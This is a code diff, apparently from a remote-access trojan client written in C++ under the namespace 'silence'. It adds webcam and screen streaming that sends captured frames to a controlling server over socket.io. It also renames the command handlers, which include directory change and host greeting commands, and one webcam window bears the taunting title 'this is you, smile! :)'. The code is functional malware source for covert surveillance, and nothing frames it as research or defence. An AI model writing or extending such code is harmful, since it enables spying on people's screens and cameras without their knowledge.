@@ -64,6 +64,45 @@ namespace silence {
         thread.detach();
     }
 
+    bool Client::stopStream(std::unique_lock<std::mutex> &lockGuard) const {
+        lockGuard.lock();
+        if (!mStreamRunning)
+            return true;
+        lockGuard.unlock();
+        return false;
+    }
+
+    void Client::camStream(std::unique_lock<std::mutex> &lockGuard) {
+        cv::VideoCapture camera;
+        if (!camera.isOpened())
+            return;
+
+        while (true) {
+            if (stopStream(lockGuard)) return;
+
+            cv::Mat image;
+            camera >> image;
+
+            if (image.empty())
+                break;
+
+            imshow("this is you, smile! :)", image);
+            response("frame", SIOBIN(impl::toBinaryString(image)));
+        }
+
+        camera.release();
+    }
+
+    void Client::screenStream(std::unique_lock<std::mutex> &lockGuard) {
+        impl::Screenshot screen;
+        while (true) {
+            if (stopStream(lockGuard)) return;
+
+            cv::Mat image{screen.take()};
+            mSocket->emit("frame", impl::toBinaryString(image));
+        }
+    }
+
     void Client::onCommand(std::string const &name, sio::message::ptr const &data,
                            bool hasAck, sio::message::list &ack_resp) {
         auto commandObject = data->get_map();
@@ -72,12 +111,11 @@ namespace silence {
 
         if (event == "greet")
             greetEvent();
-        else if (event == "start_stream")
-            launchEvent<void()>([this] { startStreamEvent(); }); // launch in new thread
-        else if (event == "kill_stream")
-            killStreamEvent();
-        else if (event == "webcamshot")
-            webcamShotEvent();
+        else if (event == "stream")
+            launchEvent<void(const CommandObject &)>([this](const CommandObject &obj) { streamEvent(obj); },
+                                                     commandObject); // launch in new thread
+        else if (event == "kstream")
+            kstreamEvent();
         else if (event == "cd")
             cdEvent(commandObject);
         else if (event == "origin")
@@ -98,50 +136,32 @@ namespace silence {
                                                   {"os",       SIOSTR(mOS)}}));
     }
 
-    void Client::webcamShotEvent() {
-        try {
-            cv::VideoCapture camera;
-            cv::Mat image;
-
-            camera.read(image);
-            response("webcamshot", SIOBIN(impl::toBinaryString(image)));
-        } catch (cv::Exception &) {
-            response("webcamshot", SIOSTR("No camera found"));
-        }
-    }
-
-    void Client::killStreamEvent() {
+    void Client::kstreamEvent() {
         std::unique_lock<std::mutex> lockGuard(mStreamLocker);
 
         if (!mStreamRunning) {
-            response("kill_stream", SIOSTR("Stream is not running"));
+            response("kstream", SIOSTR("Stream is not running"));
             return;
         }
 
         mStreamRunning = false;
-        response("kill_stream", SIOBOOL(true));
+        response("kstream", SIOBOOL(true));
     }
 
-    void Client::startStreamEvent() {
+    void Client::streamEvent(const CommandObject &object) {
         std::unique_lock<std::mutex> lockGuard(mStreamLocker);
         if (mStreamRunning) {
-            response("start_stream", SIOSTR("Stream is already running"));
+            response("stream", SIOSTR("Stream is already running"));
             return;
         }
         mStreamRunning = true;
         lockGuard.unlock();
 
-        response("start_stream", SIOSTR("Started stream"));
-        impl::Screenshot screen;
-        while (true) {
-            lockGuard.lock();
-            if (!mStreamRunning)
-                return;
-            lockGuard.unlock();
-
-            cv::Mat image{screen.take()};
-            mSocket->emit("frame", impl::toBinaryString(image));
-        }
+        response("stream", SIOSTR("Started stream"));
+        if (object.at("from_screen")->get_bool())
+            screenStream(lockGuard);
+        else
+            camStream(lockGuard);
     }
 
     void Client::cdEvent(const CommandObject &object) {
